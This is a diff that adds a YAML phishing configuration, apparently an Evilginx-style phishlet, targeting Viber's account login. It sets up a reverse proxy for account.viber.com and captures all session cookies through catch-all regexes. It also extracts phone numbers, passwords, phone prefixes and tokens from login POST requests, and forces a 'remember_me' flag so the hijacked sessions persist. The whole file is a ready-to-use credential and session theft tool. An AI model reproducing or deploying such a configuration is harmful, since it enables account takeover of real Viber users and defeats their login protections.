@@ -1,0 +1,53 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'viber.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'viber.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'account.viber.com', orig_sub: 'account', domain: 'viber.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.viber.com', orig_sub: 'account', domain: 'viber.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.viber.com', orig_sub: 'account', domain: 'viber.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'account.viber.com', orig_sub: '', domain: 'viber.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.viber.com'
+    keys: ['.*,regexp']
+  - domain: 'account.viber.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/account'
+
+credentials:
+  username:
+    key: 'phone_number'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'phone_prefix'
+      search: '(.*)'
+      type: 'post'
+    - key: 'token'
+      search: '(.*)'
+      type: 'post'
+      
+force_post:
+  - path: '/api/web/login'
+    search: 
+      - {key: 'phone_number', search: '.*'}
+      - {key: 'password', search: '.*'}
+      - {key: 'token', search: '.*'}
+    force:
+      - {key: 'remember_me', value: 'true'}
+      - {key: 'destination', value: ''}
+    type: 'post'      
+
+login:
+  domain: 'account.viber.com'
+  path: '/'
